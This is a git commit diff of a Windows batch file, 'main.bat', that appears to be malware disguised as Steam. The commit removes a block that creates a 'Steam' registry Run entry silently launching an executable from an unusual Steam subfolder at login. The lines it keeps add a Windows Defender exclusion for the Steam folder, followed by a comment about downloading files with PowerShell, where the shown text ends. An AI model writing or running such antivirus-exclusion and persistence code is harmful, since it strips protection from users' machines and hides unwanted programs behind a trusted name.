861964367e483aba5161a46258d6e2c26a5a5510
X4M1967 <107150655+X4M1967@users.noreply.github.com>
2025-03-05 21:06:38 +0100

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,31 +1,4 @@
 @echo off
-SET REG_KEY="HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-SET REG_VALUE="Steam"
-SET REG_EXPECTED_VALUE="C:\Program Files (x86)\Steam\resource\steam.exe -silent"
-
-:: Check if the registry value exists
-REG QUERY %REG_KEY% /v %REG_VALUE% >nul 2>&1
-IF %ERRORLEVEL% EQU 0 (
-    :: Registry value exists, check if it matches the expected value
-    FOR /F "tokens=3" %%A IN ('REG QUERY %REG_KEY% /v %REG_VALUE%') DO SET CURRENT_VALUE=%%A
-    IF "%CURRENT_VALUE%" == "%REG_EXPECTED_VALUE%" (
-        echo The value "%REG_VALUE%" is already set correctly: %REG_EXPECTED_VALUE%
-    ) ELSE (
-        echo The value "%REG_VALUE%" does not match. Current: "%CURRENT_VALUE%", Expected: "%REG_EXPECTED_VALUE%"
-        echo Updating the value...
-        REG ADD %REG_KEY% /v %REG_VALUE% /t REG_SZ /d %REG_EXPECTED_VALUE% /f
-        echo The value has been updated to: %REG_EXPECTED_VALUE%
-    )
-) ELSE (
-    :: Registry value does not exist, create it
-    echo The value "%REG_VALUE%" does not exist. Creating it...
-    REG ADD %REG_KEY% /v %REG_VALUE% /t REG_SZ /d %REG_EXPECTED_VALUE% /f
-    echo The value "%REG_VALUE%" has been created with value: %REG_EXPECTED_VALUE%
-)
-
-pause
-
-:: Add exclusions for Windows Defender
 powershell Add-MpPreference -ExclusionPath "C:\Program Files (x86)\Steam"
 
 :: Download files using PowerShell
